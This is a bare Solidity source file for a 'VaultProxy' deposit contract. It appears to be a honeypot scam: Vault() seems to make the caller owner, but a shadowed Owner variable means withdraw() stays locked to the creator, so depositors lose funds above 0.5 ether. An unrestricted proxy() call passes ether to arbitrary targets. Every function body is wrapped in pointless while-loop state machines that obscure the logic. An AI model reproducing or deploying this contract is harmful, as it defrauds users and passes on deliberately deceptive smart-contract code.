pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }
    
    function Vault() public payable {
        uint256 _state = 0;
        while (true) {
            if (_state == 0) {
                if (msg.sender == tx.origin) {
                    Owner = msg.sender;
                    _state = 1;
                } else {
                    break;
                }
            } else if (_state == 1) {
                deposit();
                break;
            }
        }
    }
    
    function deposit() public payable {
        uint256 _state = 0;
        while (true) {
            if (_state == 0) {
                if (msg.value > 0.5 ether) {
                    Deposits[msg.sender] += msg.value;
                    _state = 1;
                } else {
                    break;
                }
            } else if (_state == 1) {
                break;
            }
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        uint256 _state = 0;
        while (true) {
            if (_state == 0) {
                if (amount > 0 && Deposits[msg.sender] >= amount) {
                    msg.sender.transfer(amount);
                    _state = 1;
                } else {
                    break;
                }
            } else if (_state == 1) {
                break;
            }
        }
    }
}